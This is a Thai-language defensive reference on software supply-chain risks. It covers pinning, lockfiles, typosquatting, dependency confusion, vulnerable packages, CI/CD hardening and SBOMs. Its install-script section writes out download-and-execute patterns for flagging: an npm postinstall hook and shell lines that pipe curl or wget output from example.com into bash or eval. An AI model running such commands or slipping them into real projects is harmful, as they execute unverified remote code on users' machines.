# Supply Chain Patterns — รายละเอียดต่อ ecosystem

reference สำหรับ skill-cybersecurity-supply-chain · ใช้ประกอบ Phase 1–8 · เนื้อหา defensive เท่านั้น

> หมายเหตุ credential scanner: บรรทัดใดที่มีตัวอย่าง token/secret จะต่อท้ายด้วย `allowlist secret` เพื่อกัน false positive

---

## 1. Pinning — unpinned vs pinned ต่อ ecosystem

| Ecosystem | ❌ unpinned (เสี่ยง) | ✅ pinned (แนะนำ) |
|---|---|---|
| npm | `"lodash": "^4.17.0"`, `"react": "*"`, `"x": "latest"` | `"lodash": "4.17.21"` + commit `package-lock.json` |
| pip | `requests>=2.0`, `flask` (ไม่มี version) | `requests==2.32.0` + `--hash=sha256:...` |
| Go | `require x v1.2.0` ที่ไม่มี `go.sum` | version + entry ใน `go.sum` ครบ |
| Maven | `<version>RELEASE</version>`, `LATEST` | `<version>3.1.4</version>` ตายตัว |
| Composer | `"monolog/monolog": "^2.0"` | `"monolog/monolog": "2.9.3"` + `composer.lock` |
| Gem | `gem "rails"` (ไม่มี version) | `gem "rails", "7.1.3"` + `Gemfile.lock` |
| Cargo | `serde = "1"` | `serde = "=1.0.197"` + `Cargo.lock` |
| NuGet | `Version="*"` | `Version="13.0.3"` + `packages.lock.json` |

หลักการ: operator `^ ~ >= > * x latest RELEASE LATEST` = loose → flag ทุกจุด แล้วเสนอ exact version

---

## 2. Lockfile ของแต่ละภาษา

| Ecosystem | lockfile | มี integrity hash? |
|---|---|---|
| npm | `package-lock.json` | ✅ field `integrity` (sha512) |
| yarn | `yarn.lock` | ✅ |
| pnpm | `pnpm-lock.yaml` | ✅ |
| pip/poetry | `poetry.lock`, `Pipfile.lock` | ✅ `[metadata.files]` / `hashes` |
| Go | `go.sum` | ✅ h1: hashes |
| Gradle | `gradle.lockfile` | บางส่วน |
| Composer | `composer.lock` | ✅ `dist.shasum` |
| RubyGems | `Gemfile.lock` | ⚠️ ไม่มี hash โดย default (ใช้ `BUNDLE_FROZEN`) |
| Cargo | `Cargo.lock` | ✅ checksum |
| NuGet | `packages.lock.json` | ✅ `contentHash` |

ตรวจ: (a) lockfile มีอยู่ (b) committed เข้า git (c) hash field ครบ — ขาดอย่างใด = finding

---

## 3. Install-script fields (จุดรัน arbitrary code ตอนติดตั้ง)

**npm — `package.json`:**
```json
{
  "scripts": {
    "preinstall": "node setup.js",
    "install": "node-gyp rebuild",
    "postinstall": "curl https://example.com/x.sh | bash"
  }
}
```
flag: `preinstall` / `install` / `postinstall` ที่ download+execute หรือเรียก network

**pip — `setup.py`:** โค้ดที่รันตอน build/install เช่น `os.system(...)`, custom `cmdclass`, network call ใน `setup()`
- ปลอดภัยกว่า: ใช้ `pyproject.toml` (PEP 517) แบบ declarative

**build/CI ทุก ecosystem — pattern อันตราย:**
```sh
curl -sL https://example.com/install.sh | bash      # download | execute
wget -qO- http://example.com/x | sh
eval "$(curl https://example.com/env)"
```
remediation: download → verify checksum/signature → ค่อยรัน

---

## 4. Typosquatting + Dependency Confusion

**Typosquatting** — ชื่อคล้ายของดังแบบผิดนิดเดียว:
- `reqeusts` (vs `requests`) · `loadsh`/`lodahs` (vs `lodash`) · `expresss` (vs `express`)
- `python-dateutil` ↔ `python3-dateutil` · `urllib` ↔ `urllib3`
- indicator: edit-distance ใกล้ชื่อยอดนิยม, ชื่อสลับ scope, hyphen/underscore สลับ

**Dependency confusion** — internal package ชื่อชนกับ public registry:
```json
// ❌ internal package ไม่ pin registry — npm อาจไปดึงจาก public ที่ชื่อชนกัน
{ "dependencies": { "@kob/internal-utils": "^1.0.0" } }
```
remediation: pin private registry ผ่าน `.npmrc` scope mapping
```ini
@kob:registry=https://registry.internal.kob/
//registry.internal.kob/:_authToken=REDACTED_TOKEN   # allowlist secret
```
- pip: ใช้ `--index-url` เดียว + `--no-index` หรือ private index เท่านั้น (ระวัง `--extra-index-url` ที่เปิดช่อง confusion)
- ตรวจว่า internal scope/namespace มีอยู่จริงบน public registry หรือไม่ (squat risk)

---

## 5. CVE-prone packages ที่พบบ่อย (ตัวอย่าง — ต้องยืนยันด้วย advisory DB เสมอ)

**ชั้น runtime/framework (เช็คก่อนเสมอ — ตัวเลข patched/EOL ล่าสุดอยู่ใน `security-advisory-digest-2026.md`):**

| Component | เสี่ยงเมื่อ | ประเด็น (2026) |
|---|---|---|
| `node` | < 26.12.1 / 24.22.1 / 22.23.4 · line 20 (EOL) | Brotli decoder RCE, TLS hostname bypass, entropy ซ้ำใน SEA/snapshot |
| `next` | < 16.4.1 / 15.5.28 · ≤ 14.x | RCE `use cache` · Image Optimization (SVG/AVIF) · `next/og` · middleware auth bypass · React2Shell |
| `sharp` (ผ่าน next) | < 0.35.5 | memory bug → RCE บน glibc Linux |
| `starlette` (ผ่าน fastapi) | < 1.3.1 | form DoS · Host-header path poisoning · NTLM leak (Windows) |
| `python` | ≤ 3.10 (EOL) · 3.11–3.13 security-only | tarfile, coordinated fix ต.ค. 2026 |
| `postgres` | < 18.6 / 17.11 / 16.15 · ≤ 14 | 44 CVE ปี 2026 (หลายตัว 8.8 RCE), pgcrypto cleartext |
| `docker` engine | < 29.3.1 (ต้อง ≥ 29.9.2) | AuthZ bypass, `docker cp` escape, eMudhra CA |
| `openssl` ใน image | 3.0 / 3.4 / 3.6 (EOL) → ใช้ 3.5 LTS ≥ 3.5.9 | DTLS, CMS, PKCS7 UAF |
| `certifi` / `ca-certificates` | ออกก่อน 2026-10-17 | eMudhra intermediate key compromise |

**ชั้น library (ตัวอย่าง — ต้องยืนยันด้วย advisory DB เสมอ):**

| Package | ecosystem | บริบทที่ควรเช็คเป็นพิเศษ |
|---|---|---|
| `keyv` และ package ของ maintainer เดียวกัน (ส.ค. 2026) · TanStack / AntV / `@mistralai` (พ.ค. 2026) | npm | ถูก Shai-Hulud/CHAINDROP ฝัง worm — เช็ค version ที่ติดตั้งว่าไม่ใช่ช่วงที่ถูก compromise |
| `litellm` 1.82.7–1.82.8 (มี.ค. 2026) · `durabletask` 1.4.1–1.4.3 · `mistralai` / `guardrails-ai` (พ.ค. 2026) | pip | publish ด้วย credential ที่ขโมยมา — version ถูกถอนแล้ว แต่ lockfile เก่าอาจยัง pin อยู่ |
| `lodash` < 4.17.21 · `minimist` < 1.2.6 | npm | prototype pollution |
| `event-stream` 3.3.6 | npm | เคยถูกฝัง malware (compromised maintainer) |
| `log4j-core` 2.0–2.14 · `xstream`/`fastjson` เก่า | maven | Log4Shell / deserialization RCE |
| `requests`/`urllib3` เก่า · `pyyaml` < 5.4 (`yaml.load`) | pip | TLS/redirect · unsafe deserialization |

> รายการนี้เป็น starting point ไม่ใช่ทั้งหมด — เทียบ version จริงกับ advisory (GHSA/OSV/NVD) แล้ว mark `ยืนยันแล้ว` หรือ `ต้องยืนยัน`

---

## 6. CI/CD pinning (Phase 7)

**GitHub Actions — pin ด้วย SHA ไม่ใช่ tag:**
```yaml
# ❌ tag = mutable — เจ้าของ retag ได้
- uses: actions/checkout@v4
# ✅ pin commit SHA (immutable) + comment บอก version
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

**Dockerfile — pin digest + line ที่ยัง support:**
```dockerfile
# ❌ FROM node:20            (line 20 EOL 2026-04-30 — ไม่ได้ patch Brotli RCE)
# ✅ FROM node:24-alpine@sha256:abcd...   ไม่ใช้ :latest · ย้ายเป็น 26 หลัง 2026-10-28
```
flag เพิ่ม: secrets ที่ส่งให้ third-party action, action จาก repo ที่ไม่ verify, `pull_request_target` + checkout PR code (ต้นเหตุ Trivy/TanStack ถูกยึดปี 2026), action ที่เคย compromise แล้วกลับมาออนไลน์พร้อม tag เดิม (`actions-cool/*` ก.ย. 2026)

**Publish credential → Trusted Publishing (OIDC):** npm classic token ถูก revoke ถาวร (2025-12-09) · granular token write ต้อง 2FA + ≤ 90 วัน → CI ควรใช้ OIDC แทน
```yaml
# ✅ npm publish ผ่าน OIDC (ตั้ง trusted publisher บน npmjs.com ก่อน) — ไม่มี NPM_TOKEN ใน secrets
permissions: { id-token: write, contents: read }
steps:
  - run: npm publish --provenance --access public
# PyPI: pypa/gh-action-pypi-publish@<sha> + trusted publisher บน pypi.org — ไม่ใช้ API token
```

**Cooldown (กัน version ที่เพิ่ง publish ภายในชั่วโมงแรก — ทุก worm wave ปี 2026 ถูกถอนใน 1–3 วัน):**
```ini
# .npmrc (npm >= 11.10)
min-release-age=7
```
```yaml
# pnpm-workspace.yaml (หน่วยนาที)
minimumReleaseAge: 4320
```
```json
// renovate.json
{ "extends": ["config:best-practices"], "minimumReleaseAge": "3 days" }
```

---

## 7. วิธีอ่าน SBOM

SBOM = รายการ component ทั้งหมดของซอฟต์แวร์ มาตรฐานหลัก:
- **CycloneDX** (`bom.json`/`bom.xml`) — `components[].{name,version,purl,hashes,licenses}`
- **SPDX** (`*.spdx.json`) — `packages[].{name,versionInfo,downloadLocation,checksums}`

**purl (package URL)** ใช้ระบุ component ข้าม ecosystem:
```
pkg:npm/lodash@4.17.21
pkg:pypi/requests@2.32.0
pkg:golang/github.com/gin-gonic/gin@v1.9.1
```

อ่าน SBOM เพื่อ: (a) cross-check กับ lockfile ว่าตรงกัน (b) หา component ที่ไม่มี hash/license (c) ป้อนเข้า CVE matching

**เทมเพลต SBOM ใน report:**
| name | version | ecosystem | direct/transitive | hash | license |
|---|---|---|---|---|---|
| lodash | 4.17.21 | npm | direct | ✅ | MIT |
| (transitive deps...) | | | transitive | | |
